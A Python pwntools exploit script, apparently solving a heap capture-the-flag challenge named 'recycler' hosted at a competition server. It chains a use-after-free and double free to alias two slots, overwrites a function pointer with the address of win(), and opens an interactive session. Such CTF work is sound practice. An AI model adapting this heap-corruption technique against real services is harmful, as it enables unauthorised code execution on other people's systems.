#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./recycler', checksec=False)

def conn():
    if args.REMOTE:
        return remote('localhost', 1337)
    return process(elf.path)

p = remote("offsec.m0lecon.it", 13515)

OFFSET_TO_DISPLAY = 16 # bytes from start of note to slot->display
win_addr = 0x004012f2 # address of win() in the binary

#create slot
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'1') # index
p.sendlineafter(b'data: ', b'hello') #  Data

#free slot
p.sendlineafter(b'> ', b'2') # free
p.sendlineafter(b'index: ', b'1') # index

#edit slot
p.sendlineafter(b'> ', b'3') # edit
p.sendlineafter(b'index: ', b'1') # index
p.sendlineafter(b'payload: ', b'aaaaaaaaaaaaaaaa') #  Data

#free slot again
p.sendlineafter(b'> ', b'2') # create
p.sendlineafter(b'index: ', b'1') # index


#create slot
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'2') # index
p.sendlineafter(b'data: ', b'hello2') #  Data

#create second aliased slot
p.sendlineafter(b'> ', b'1') # create
p.sendlineafter(b'index: ', b'3') # index
p.sendlineafter(b'data: ', b'hello3') #  Data





payload = flat(
    p64(win_addr),
    b"A"*24
)

#edit slot 2
p.sendlineafter(b'> ', b'3') # create
p.sendlineafter(b'index: ', b'2') # index
p.sendlineafter(b'payload: ', payload) #  Data

#invoke slot 3
p.sendlineafter(b'> ', b'4') # create
p.sendlineafter(b'index: ', b'3') # index

print(p.recvall(timeout=1).decode(errors='replace'))

p.interactive()
